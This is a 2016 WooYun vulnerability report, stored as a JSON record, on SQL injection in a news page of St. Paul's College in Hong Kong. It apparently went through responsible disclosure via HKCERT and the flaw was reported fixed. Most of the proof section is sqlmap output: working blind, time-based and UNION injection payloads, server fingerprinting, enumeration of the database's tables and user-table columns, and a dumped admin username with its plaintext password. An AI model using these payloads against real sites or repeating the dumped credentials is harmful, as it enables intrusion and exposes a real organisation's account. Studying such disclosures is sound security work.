{"id": 74585, "wybug_id": "wooyun-2016-0175614", "wybug_title": "香港圣保罗书院SQL注入（香港地區）", "wybug_corp": "香港圣保罗书院", "wybug_author": "路人甲", "wybug_date": "2016-02-16 10:11", "wybug_open_date": "2016-03-01 14:43", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "\t\t\t\t\t\t\t\t已交由第三方合作机构(hkcert香港互联网应急协调中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-02-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-02-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-02-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-03-01：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 1,2,1 详细说明：  \nhttp://**.**.**.**/news_detail.php?type=news&na_id=2295na_id参数存在sql注入\n   漏洞证明：  \nsqlmap identified the following injection points with a total of 4030 HTTP(s) requests:---Parameter: na_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: type=news&na_id=2295 AND 6977=6977    Vector: AND [INFERENCE]    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 time-based blind - Parameter replace    Payload: type=news&na_id=(SELECT (CASE WHEN (5901=5901) THEN SLEEP(5) ELSE 5901*(SELECT 5901 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))    Type: UNION query    Title: Generic UNION query (NULL) - 23 columns    Payload: type=news&na_id=-9555 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71706a6b71,0x7565555a424852634673,0x717a787171)--     Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY]-- ---web server operating system: Linux SuSE 11.1web application technology: PHP 5.2.6, Apache 2.2.10back-end DBMS: MySQL 5.0.12current user:    'spc@localhost'current database:    'spc'current user is DBA:    Falseavailable databases [2]:[*] information_schema[*] spcsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: na_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: type=news&na_id=2295 AND 6977=6977    Vector: AND [INFERENCE]    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 time-based blind - Parameter replace    Payload: type=news&na_id=(SELECT (CASE WHEN (5901=5901) THEN SLEEP(5) ELSE 5901*(SELECT 5901 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))    Type: UNION query    Title: Generic UNION query (NULL) - 23 columns    Payload: type=news&na_id=-9555 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71706a6b71,0x7565555a424852634673,0x717a787171)--     Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY]-- ---web server operating system: Linux SuSE 11.1web application technology: PHP 5.2.6, Apache 2.2.10back-end DBMS: MySQL 5.0.12Database: spc[30 tables]+---------------+| user          || album         || archievement  || background    || banner        || banner2       || class         || class_subject || content       || main_banner   || menu          || na            || na_attachment || news          || photo         || principal_msg || product       || sa            || sa_album      || sa_committee  || sa_news       || sa_photo      || staff         || staff_title   || style         || sub_menu      || subject       || system_page   || title         || user_page     |+---------------+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: na_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: type=news&na_id=2295 AND 6977=6977    Vector: AND [INFERENCE]    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 time-based blind - Parameter replace    Payload: type=news&na_id=(SELECT (CASE WHEN (5901=5901) THEN SLEEP(5) ELSE 5901*(SELECT 5901 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))    Type: UNION query    Title: Generic UNION query (NULL) - 23 columns    Payload: type=news&na_id=-9555 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71706a6b71,0x7565555a424852634673,0x717a787171)--     Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY]-- ---web server operating system: Linux SuSE 11.1web application technology: PHP 5.2.6, Apache 2.2.10back-end DBMS: MySQL 5.0.12Database: spcTable: user[4 columns]+----------+-------------+| Column   | Type        |+----------+-------------+| id       | int(11)     || password | varchar(40) || status   | varchar(5)  || username | varchar(40) |+----------+-------------+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: na_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: type=news&na_id=2295 AND 6977=6977    Vector: AND [INFERENCE]    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 time-based blind - Parameter replace    Payload: type=news&na_id=(SELECT (CASE WHEN (5901=5901) THEN SLEEP(5) ELSE 5901*(SELECT 5901 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))    Type: UNION query    Title: Generic UNION query (NULL) - 23 columns    Payload: type=news&na_id=-9555 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71706a6b71,0x7565555a424852634673,0x717a787171)--     Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY]-- ---web server operating system: Linux SuSE 11.1web application technology: PHP 5.2.6, Apache 2.2.10back-end DBMS: MySQL 5.0.12Database: spcTable: user[1 entry]+----------+----------+| username | password |+----------+----------+| admin    | s3p2c@!! |+----------+----------+\n   修复方案：  参数化查询过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2016-02-17 16:05 厂商回复： 已將事件通知有關機構 最新状态： 2016-03-01：相關機構回報已修復漏洞  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}